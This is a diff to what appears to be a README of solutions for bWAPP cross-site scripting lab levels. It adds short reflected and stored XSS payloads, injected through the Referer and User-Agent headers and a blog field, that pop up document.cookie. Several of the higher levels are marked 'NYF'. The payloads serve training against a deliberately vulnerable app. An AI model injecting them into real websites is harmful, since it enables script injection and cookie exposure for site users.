@@ -97,5 +97,27 @@ Welcome to the repository of comprehensive solutions for bWAPP's Cross-Site Scri
 # XSS - Reflected (Referer)(Medium)
 ```Payload – Referer:<svg onload=alert(document.cookie)>```
 
+# XSS - Reflected (Referer)(High)
+```Payload – NYF```
+
+# XSS - Reflected (User-Agent)(Low)
+```Payload – User-agent:<script>alert(document.cookie)</script>```
+
+# XSS - Reflected (User-Agent)(Medium)
+```Payload – User-agent:<svg onload=alert(document.cookie)>```
+
+# XSS - Reflected (User-Agent)(High)
+```Payload – NYF```
+
+# XSS - Stored (Blog)(Low)
+```Payload – <img src=x onerror=alert(document.cookie)>```
+
+# XSS – Stored (Blog)(Medium)
+```Payload – <svg onload=alert(document.cookie)>```
+
+# XSS - Stored (Blog)(High)
+```Payload – NYF``` 
+
+
   
 
